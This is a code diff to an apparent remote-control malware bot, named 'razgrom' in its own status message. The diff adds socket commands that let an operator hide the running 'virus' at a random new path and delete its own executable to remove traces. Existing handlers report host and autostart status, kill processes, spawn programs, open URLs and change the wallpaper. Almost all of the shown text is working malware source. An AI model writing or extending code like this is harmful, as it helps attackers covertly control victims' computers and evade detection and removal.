@@ -7,6 +7,8 @@ import os
 
 import re
 
+from modules import *
+
 def send_status_sock(conn, l: list, i: int):
     conn.send(("Bot 'razgrom' online, host info:\n" + platform.platform() + '\n' + ("Autostart configured!" if is_in_autorun() else "Autostart unconfigured!\n")).encode())
 
@@ -51,13 +53,29 @@ def wallpaper_sock(conn, l: list, i: int):
     except Exception as e:
         conn.send("Error!\n".encode())
 
+def randomhide_sock(conn, l: list, i: int):
+    try:
+        conn.send(("Virus hidden, new path: " + self_hide() + '\n').encode())
+    except Exception as e:
+        conn.send("Error!\n".encode())
+
+def selfdestruct_sock(conn, l: list, i: int):
+    try:
+        os.remove(sys.executable)
+        conn.send("Successful destruction!\n".encode())
+        exit(0)
+    except Exception as e:
+        conn.send("Error!\n".encode())
+    
 HANDLERS_SOCKET = {
     "status": send_status_sock,
     "open": url_open_sock,
     "pkill": pkill_sock,
     "spawn": spawn_sock,
     "imgpopup": imgpopup_sock,
-    "wallpaper": wallpaper_sock
+    "wallpaper": wallpaper_sock,
+    "randomhide": randomhide_sock,
+    "selfdestruct": selfdestruct_sock
 }
 
 def handle_socket_commands(conn, text):
